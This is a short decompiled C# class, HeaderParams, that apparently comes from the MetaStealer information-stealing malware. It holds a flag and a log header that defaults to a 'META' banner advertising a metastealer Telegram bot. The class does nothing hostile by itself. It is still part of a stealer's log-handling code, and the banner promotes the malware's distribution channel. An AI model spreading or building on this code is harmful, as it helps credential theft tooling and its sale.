using System;
using System.Runtime.CompilerServices;

namespace Meta.MainPanel.LogExt;

public class HeaderParams
{
    [CompilerGenerated]
    private IntPtr intptr_0;

    [CompilerGenerated]
    private object object_0;

    public bool Activated
    {
        [CompilerGenerated]
        get
        {
            return (byte)(nint)intptr_0 != 0;
        }
        [CompilerGenerated]
        set
        {
            intptr_0 = (IntPtr)(value ? 1 : 0);
        }
    }

    public string Header
    {
        [CompilerGenerated]
        get
        {
            return (string)object_0;
        }
        [CompilerGenerated]
        set
        {
            object_0 = value;
        }
    }

    public HeaderParams(bool activated, string header)
    {
        Activated = activated;
        if (Activated && !string.IsNullOrWhiteSpace(header))
        {
            Header = header;
        }
        else
        {
            Header = "***********************************************\r\n*               _   _   _   _                 *\r\n*              / \\ / \\ / \\ / \\                *\r\n*             ( M | E | T | A )               *\r\n*              \\_/ \\_/ \\_/ \\_/                *\r\n*                                             *\r\n*    Telegram: https://t.me/metastealer_bot   *\r\n***********************************************";
        }
    }
}
